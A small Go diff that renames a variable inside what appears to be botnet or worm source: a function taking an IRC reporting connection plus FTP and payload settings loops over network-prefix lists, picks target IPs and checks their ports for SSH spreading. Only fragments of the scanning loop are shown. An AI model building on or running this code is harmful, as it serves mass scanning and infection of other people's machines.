@@ -120,7 +120,7 @@ func ssh_session(ssh_session *ssh.Client, command string) {
 }
 
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
-	NetList := []string{
+	netList := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
 		cgpn1, cgpn2, cgpn3, cgpn4, cgpn5,
 		cjpn1, cjpn2, cjpn3, cjpn4, cjpn5,
@@ -145,8 +145,8 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	}
 
 	for {
-		for net := range NetList {
-			target := nextIP(NetList[net])
+		for net := range netList {
+			target := nextIP(netList[net])
 			ptrTarget := &target
 			turnRange := checkPort(*ptrTarget)
 
